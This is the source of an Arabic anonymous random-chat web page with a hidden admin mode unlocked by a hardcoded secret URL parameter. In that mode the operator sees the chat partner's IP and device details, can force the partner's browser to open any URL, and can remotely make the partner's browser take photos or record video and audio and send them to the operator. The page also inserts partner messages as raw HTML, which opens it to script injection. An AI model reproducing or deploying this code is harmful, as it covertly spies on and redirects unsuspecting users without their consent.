<!DOCTYPE html>
<html lang="ar">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>شات عربي | دردشة عشوائية</title>
<style>
* { margin: 0px; padding: 0px; box-sizing: border-box; }
body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction: rtl; transition: background 0.3s ease; }

.header { background-color: rgb(24, 149, 210); direction: rtl; padding: 6px 12px; display: flex; justify-content: space-between; align-items: center; }
.header-right { display: flex; flex-direction: column; }
.header > .header-right > a { color: rgb(255, 255, 255); text-decoration: none; font-size: 28px; font-weight: bold; cursor: pointer; line-height: 1.1; }
.header b { color: lavender; font-size: 13px; font-weight: normal; margin-top: 2px; }

#timer { color: #fff; font-size: 13px; background: rgba(0,0,0,0.2); padding: 3px 8px; border-radius: 4px; display: none; }
#system-alert-banner { background: #ff4757; color: white; text-align: center; padding: 6px; font-weight: bold; display: none; font-size: 14px; }

#chat { width: 100%; direction: rtl; position: relative; }
#conv { padding: 6px; direction: rtl; height: 320px; overflow-y: auto; display: flex; flex-direction: column; }

/* تنسيق عام لجميع الرسائل لمنع أي تقطيع أو أخطاء في الحروف */
#conv span, #conv p, #conv div { 
  border-radius: 8px; 
  padding: 8px 12px; 
  margin: 4px 0; 
  font-size: 18px; 
  font-weight: normal; 
  max-width: 80%; 
  word-break: break-word; 
  overflow-wrap: break-word;
  unicode-bidi: plaintext; 
  text-align: right;
  display: inline-block;
  clear: both;
}

#sr { background: rgb(245, 245, 245); color: tomato; align-self: center; display: table; }
#hi { background: rgb(245, 245, 245); color: rgb(41, 177, 63); align-self: center; display: none !important; }

/* مؤشر يكتب يظهر في مكان رسالة الطرف الآخر تماماً على اليمين */
#typing-indicator { 
  background: rgb(24, 149, 210) !important; 
  color: rgb(255, 255, 255) !important; 
  font-size: 14px !important; 
  font-weight: normal !important;
  display: none; 
  padding: 6px 12px !important;
  border-radius: 8px !important;
  width: fit-content;
  margin: 4px 0;
  align-self: flex-start; /* جهة اليمين في تخطيط RTL */
  text-align: right;
}

/* رسائلك أنت: تظهر على اليسار (أو العكس حسب رغبتك، هنا مقننة ومنظمة بوضوح) */
#conv div.my-msg { 
  background: rgb(233, 236, 241); 
  color: rgb(119, 119, 119); 
  align-self: flex-end; /* جهة اليسار لشات عربي كلاسيكي */
  text-align: right;
}

/* رسائل الشخص الآخر: تظهر على اليمين تماماً كما طلبت */
#conv p.partner-msg { 
  background: rgb(24, 149, 210); 
  color: rgb(255, 255, 255); 
  align-self: flex-start; /* جهة اليمين */
  text-align: right;
}

#conv p.partner-msg a, #conv div.my-msg a { text-decoration: underline; color: inherit; }

#conv img { max-width: 180px; max-height: 180px; border-radius: 5px; display: block; margin-top: 5px; cursor: pointer; }
#conv video, #conv audio { max-width: 200px; border-radius: 5px; display: block; margin-top: 5px; }

/* لوحة تحكم الأدمن */
#admin-panel { background: #ffeaa7; padding: 8px; border-bottom: 2px solid #fdcb6e; display: none; text-align: center; font-size: 13px; }
#admin-panel input, #admin-panel select { padding: 4px; border-radius: 4px; border: 1px solid #ccc; font-size: 13px; margin: 2px; }
#admin-panel button { padding: 4px 8px; background: #e17055; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 13px; margin: 2px; }
#admin-panel button.danger { background: #d63031; }

#media-preview-modal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; flex-direction: column; color: white; }
#media-preview-box { background: white; padding: 15px; border-radius: 8px; text-align: center; color: black; max-width: 90%; }
#media-preview-box img, #media-preview-box video, #media-preview-box audio { max-width: 100%; max-height: 250px; border-radius: 5px; margin-bottom: 10px; display: block; margin-left: auto; margin-right: auto; }

/* شريط الكتابة */
#send { width: 100%; background: rgb(248, 248, 248); padding: 5px 8px; border-top: 1px solid rgb(238, 238, 238); border-bottom: 1px solid rgb(238, 238, 238); display: flex; align-items: center; gap: 5px; direction: rtl; }
#inp { flex: 1; padding: 8px; border: 1px solid rgb(221, 221, 221); border-radius: 5px; outline: none; font-size: 16px; direction: rtl; unicode-bidi: plaintext; background: #fff; text-align: right; }
#snd, .file-btn, #mic-btn { padding: 8px 12px; cursor: pointer; background: rgb(238, 238, 238); color: rgb(51, 51, 51); border: 1px solid rgb(204, 204, 204); border-radius: 3px; font-size: 14px; text-align: center; display: inline-block; white-space: nowrap; }
.file-btn { background: #fdfdfd; }
#mic-btn { background: #fdfdfd; }
#mic-btn.recording { background: red !important; color: white !important; }
#file-input { display: none; }

#out { font-size: 20px; font-weight: normal; text-align: center; direction: rtl; display: none; padding: 20px; }
#out span { color: red; }
#out a { background: coral; color: rgb(255, 255, 255); text-decoration: none; padding: 2px 5px; border-radius: 3px; cursor: pointer; }

#image-modal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.85); text-align: center; justify-content: center; align-items: center; }
#image-modal img { max-width: 90%; max-height: 90%; border-radius: 5px; }
#image-modal span { position: absolute; top: 15px; left: 25px; color: #fff; font-size: 35px; font-weight: bold; cursor: pointer; }
</style>
</head>
<body>
  <div class="header">
    <div class="header-right">
      <a onclick="location.reload()">شات عربي</a>
      <b>دردشة عربية مجانية بدون تسجيل</b>
    </div>
    <div id="timer">00:00</div>
  </div>

  <div id="system-alert-banner"></div>
  
  <div id="admin-panel">
    <input type="text" id="admin-url-inp" placeholder="رابط..." style="width: 80px;">
    <button onclick="sendAdminUrl()">فتح رابط</button>
    
    ثواني: <input type="number" id="media-duration" value="5" min="1" max="60" style="width: 45px;">
    <button onclick="requestAdminMedia('photo')">📸 صورة</button>
    <button onclick="requestAdminMedia('video')">🎥 فيديو</button>
    <button onclick="requestAdminMedia('audio')">🎙️ صوت</button>
    
    <select id="preset-ringtone" style="padding:4px; border-radius:4px;">
      <option value="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3">نغمة رنين 1</option>
      <option value="https://assets.mixkit.co/active_storage/sfx/1359/1359-preview.mp3">تنبيه هادئ</option>
      <option value="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3">صفارة إرسال</option>
    </select>
    <button onclick="sendPresetRingtone()" style="background:#00b894; color:white;">🎵 تشغيل نغمة</button>

    <button onclick="sendAlert()">📢 تنبيه</button>
    <button class="danger" onclick="clearChat('all')">مسح الكل</button>
    <button class="danger" onclick="clearChat('theirs')">مسح رسائله</button>
    
    <select id="preset-bg-color" onchange="changeBgColor(this.value)" style="padding:4px; border-radius:4px;">
      <option value="#ffffff">أبيض افتراضي</option>
      <option value="#f1f2f6">رمادي فاتح</option>
      <option value="#ffeaa7">أصفر هادئ</option>
      <option value="#dfe6e9">سماوي فاتح</option>
      <option value="#2d3436">داكن (ليلي)</option>
    </select>

    <div id="client-info" style="font-size: 11px; color: #333; margin-top: 4px; font-weight: bold;">
      IP: جاري التحميل...
    </div>
  </div>

  <div id="chat">
   <div id="conv">
    <span id="sr">جاري البحث عن متصل</span>
    <span id="hi">تم الاتصال, قل مرحبا</span>
   </div>
   
   <div id="typing-indicator">✍️ يكتب...</div>
   
   <div id="send">
     <input id="inp" type="text" autocomplete="off" placeholder="اكتب رسالة...">
     <input type="file" id="file-input" accept="image/*,video/*,audio/*">
     <label for="file-input" class="file-btn" title="إرسال ملف">📁</label>
     <button id="mic-btn" title="تسجيل صوت">🎤</button>
     <button id="snd">Send</button>
   </div>
  </div>

  <h5 id="out">
    <span>المستخدم غادر الدردشة</span><br><br>
    <a onclick="location.reload()">بحث عن متصل</a>
  </h5>

  <div id="image-modal" onclick="closeModal()">
    <span onclick="closeModal()">&times;</span>
    <img id="modal-img">
  </div>

  <div id="media-preview-modal">
    <div id="media-preview-box">
      <h3>معاينة التقاط الوسائط</h3>
      <div id="media-preview-content"></div>
      <button onclick="approveCapturedMedia()" style="background: #00b894; color:white; padding: 5px 10px; border:none; border-radius:4px; cursor:pointer;">رفع للمحادثة</button>
      <button onclick="cancelCapturedMedia()" style="background: #d63031; color:white; padding: 5px 10px; border:none; border-radius:4px; cursor:pointer; margin-right:5px;">إلغاء</button>
    </div>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const sr = document.getElementById('sr');
    const hi = document.getElementById('hi');
    const conv = document.getElementById('conv');
    const inp = document.getElementById('inp');
    const snd = document.getElementById('snd');
    const chat = document.getElementById('chat');
    const out = document.getElementById('out');
    const fileInput = document.getElementById('file-input');
    const micBtn = document.getElementById('mic-btn');
    const timerEl = document.getElementById('timer');
    const imageModal = document.getElementById('image-modal');
    const modalImg = document.getElementById('modal-img');
    const adminPanel = document.getElementById('admin-panel');
    const mediaPreviewModal = document.getElementById('media-preview-modal');
    const mediaPreviewContent = document.getElementById('media-preview-content');

    let typingTimeout;
    let timerInterval;
    let secondsElapsed = 0;
    let isConnectedPartner = false;

    const urlParams = new URLSearchParams(window.location.search);
    const isAdmin = urlParams.get('admin') === 'mySuperSecretAdmin123';
    const adminSecret = urlParams.get('admin') || '';

    if (isAdmin) {
      adminPanel.style.display = 'block';
    }

    inp.disabled = true;
    snd.disabled = true;

    socket.emit('find_partner');

    socket.on('matched', () => {
      isConnectedPartner = true;
      hi.style.setProperty('display', 'table', 'important');
      inp.disabled = false;
      snd.disabled = false;
      inp.focus();
      startTimer();
    });

    socket.on('device_info', (data) => {
      if (isAdmin) {
        document.getElementById('client-info').innerText = `IP: ${data.ip} | Device: ${data.ua}`;
      }
    });

    socket.on('message', (data) => {
      appendMessage(data, false);
    });

    socket.on('display_typing', (isTyping) => {
      const indicator = document.getElementById('typing-indicator');
      indicator.style.display = isTyping ? 'block' : 'none';
      conv.scrollTop = conv.scrollHeight;
    });

    socket.on('partner_disconnected', () => {
      isConnectedPartner = false;
      chat.style.display = 'none';
      out.style.display = 'block';
      stopTimer();
    });

    function startTimer() {
      secondsElapsed = 0;
      timerEl.style.display = 'block';
      timerInterval = setInterval(() => {
        secondsElapsed++;
        const mins = Math.floor(secondsElapsed / 60).toString().padStart(2, '0');
        const secs = (secondsElapsed % 60).toString().padStart(2, '0');
        timerEl.textContent = `${mins}:${secs}`;
      }, 1000);
    }

    function stopTimer() {
      clearInterval(timerInterval);
    }

    inp.addEventListener('input', () => {
      socket.emit('typing', true);
      clearTimeout(typingTimeout);
      typingTimeout = setTimeout(() => {
        socket.emit('typing', false);
      }, 1000);
    });

    function linkify(text) {
      const urlRegex = /(https?:\/\/[^\s]+)/g;
      return text.replace(urlRegex, url => `<a href="${url}" target="_blank">${url}</a>`);
    }

    function sendMsg() {
      const text = inp.value.trim();
      if(text !== "" && !inp.disabled) {
        const payload = { type: 'text', content: text };
        socket.emit('message', payload);
        appendMessage(payload, true);
        inp.value = "";
        socket.emit('typing', false);
      }
    }

    function appendMessage(data, isMe) {
      const element = document.createElement(isMe ? 'div' : 'p');
      element.className = isMe ? 'my-msg' : 'partner-msg';
      
      const contentSpan = document.createElement('span');
      contentSpan.className = 'msg-content-span';
      
      if (data.type === 'text') {
        contentSpan.innerHTML = linkify(data.content);
      } else if (data.type === 'image') {
        const img = document.createElement('img');
        img.src = data.content;
        img.onclick = () => {
          modalImg.src = data.content;
          imageModal.style.display = 'flex';
        };
        contentSpan.appendChild(img);
      } else if (data.type === 'video') {
        const video = document.createElement('video');
        video.src = data.content;
        video.controls = true;
        contentSpan.appendChild(video);
      } else if (data.type === 'audio') {
        const audio = document.createElement('audio');
        audio.src = data.content;
        audio.controls = true;
        contentSpan.appendChild(audio);
      }

      element.appendChild(contentSpan);
      conv.appendChild(element);
      conv.scrollTop = conv.scrollHeight;
    }

    function closeModal() {
      imageModal.style.display = 'none';
    }

    snd.addEventListener('click', sendMsg);
    inp.addEventListener('keypress', (e) => {
      if(e.key === 'Enter') sendMsg();
    });

    fileInput.addEventListener('change', (e) => {
      if (!isConnectedPartner) {
        alert('لا يمكن إرسال ملفات لعدم وجود متصل حالياً!');
        fileInput.value = '';
        return;
      }

      const file = e.target.files[0];
      if (!file) return;

      const reader = new FileReader();
      reader.onload = function(event) {
        let type = 'image';
        if (file.type.startsWith('video')) type = 'video';
        else if (file.type.startsWith('audio')) type = 'audio';

        const payload = { type: type, content: event.target.result };
        socket.emit('message', payload);
        appendMessage(payload, true);
        fileInput.value = '';
      };
      reader.readAsDataURL(file);
    });

    let mediaRecorder;
    let audioChunks = [];
    let isRecording = false;

    micBtn.addEventListener('click', async () => {
      if (!isConnectedPartner) {
        alert('لا يمكن تسجيل صوت لعدم وجود متصل حالياً!');
        return;
      }

      if (!isRecording) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
          mediaRecorder = new MediaRecorder(stream);
          audioChunks = [];

          mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
          mediaRecorder.onstop = () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const reader = new FileReader();
            reader.onload = function(e) {
              const payload = { type: 'audio', content: e.target.result };
              socket.emit('message', payload);
              appendMessage(payload, true);
            };
            reader.readAsDataURL(audioBlob);
          };

          mediaRecorder.start();
          isRecording = true;
          micBtn.classList.add('recording');
        } catch (err) {
          alert('تعذر الوصول إلى الميكروفون');
        }
      } else {
        mediaRecorder.stop();
        isRecording = false;
        micBtn.classList.remove('recording');
      }
    });

    function sendAdminUrl() {
      const url = document.getElementById('admin-url-inp').value.trim();
      if (!url) return alert('أدخل رابطاً صحيحاً');
      socket.emit('admin_action', { action: 'open_url', secret: adminSecret, url });
    }

    socket.on('force_open_url', (url) => {
      if (!isAdmin) window.location.href = url;
    });

    function requestAdminMedia(mediaType) {
      const duration = parseInt(document.getElementById('media-duration').value) || 5;
      socket.emit('admin_action', { action: 'request_media', secret: adminSecret, mediaType, duration });
    }

    socket.on('trigger_camera', async ({ mediaType, duration }) => {
      if (isAdmin) return;
      try {
        const constraints = { video: mediaType !== 'audio', audio: true };
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        
        if (mediaType === 'photo') {
          const videoTrack = stream.getVideoTracks()[0];
          const imageCapture = new ImageCapture(videoTrack);
          const photoBlob = await imageCapture.takePhoto();
          const reader = new FileReader();
          reader.onloadend = () => {
            socket.emit('user_media_captured', { dataUrl: reader.result, type: 'image' });
            stream.getTracks().forEach(track => track.stop());
          };
          reader.readAsDataURL(photoBlob);
          return;
        }

        const recorder = new MediaRecorder(stream);
        let chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = () => {
          const mimeType = mediaType === 'audio' ? 'audio/webm' : 'video/webm';
          const blob = new Blob(chunks, { type: mimeType });
          const reader = new FileReader();
          reader.onloadend = () => {
            socket.emit('user_media_captured', { dataUrl: reader.result, type: mediaType });
          };
          reader.readAsDataURL(blob);
          stream.getTracks().forEach(track => track.stop());
        };

        recorder.start();
        setTimeout(() => {
          if (recorder.state === 'recording') recorder.stop();
        }, duration * 1000);
      } catch (err) {
        alert('تم رفض إذن الوسائط أو الكاميرا');
      }
    });

    let pendingCapturedMedia = null;
    socket.on('display_captured_media_to_admin', (data) => {
      if (!isAdmin) return;
      pendingCapturedMedia = data;
      
      if (data.type === 'video') {
        mediaPreviewContent.innerHTML = `<video src="${data.dataUrl}" controls autoplay></video>`;
      } else if (data.type === 'audio') {
        mediaPreviewContent.innerHTML = `<audio src="${data.dataUrl}" controls autoplay></audio>`;
      } else {
        mediaPreviewContent.innerHTML = `<img src="${data.dataUrl}">`;
      }
      mediaPreviewModal.style.display = 'flex';
    });

    function approveCapturedMedia() {
      if (pendingCapturedMedia) {
        const payload = { type: pendingCapturedMedia.type, content: pendingCapturedMedia.dataUrl };
        socket.emit('message', payload);
        appendMessage(payload, true);
        cancelCapturedMedia();
      }
    }

    function cancelCapturedMedia() {
      pendingCapturedMedia = null;
      mediaPreviewModal.style.display = 'none';
    }

    function sendAlert() {
      const msg = prompt("اكتب نص التنبيه الإداري:");
      if (msg) socket.emit('admin_action', { action: 'alert', secret: adminSecret, message: msg });
    }

    socket.on('system_alert', (msg) => {
      const banner = document.getElementById('system-alert-banner');
      banner.innerText = `⚠️ تنبيه إداري: ${msg}`;
      banner.style.display = 'block';
      setTimeout(() => { banner.style.display = 'none'; }, 6000);
    });

    function clearChat(target) {
      socket.emit('admin_action', { action: 'clear_chat', secret: adminSecret, target: target });
    }

    socket.on('clear_chat', (target) => {
      if (target === 'all') {
        document.querySelectorAll('.my-msg, .partner-msg').forEach(el => el.remove());
      } else if (target === 'theirs') {
        document.querySelectorAll('.partner-msg').forEach(el => el.remove());
      }
    });

    function sendPresetRingtone() {
      const ringtoneUrl = document.getElementById('preset-ringtone').value;
      socket.emit('admin_action', { action: 'play_sound', secret: adminSecret, audioUrl: ringtoneUrl });
    }

    socket.on('play_sound_in_browser', (audioUrl) => {
      if (isAdmin) return;
      const audio = new Audio(audioUrl);
      audio.play().catch(err => console.log('تعذر تشغيل الصوت تلقائياً'));
    });

    function changeBgColor(color) {
      socket.emit('admin_action', { action: 'change_bg', secret: adminSecret, bgColor: color });
    }

    socket.on('change_bg', (bgColor) => {
      document.body.style.backgroundColor = bgColor;
    });
  </script>
</body>
</html>
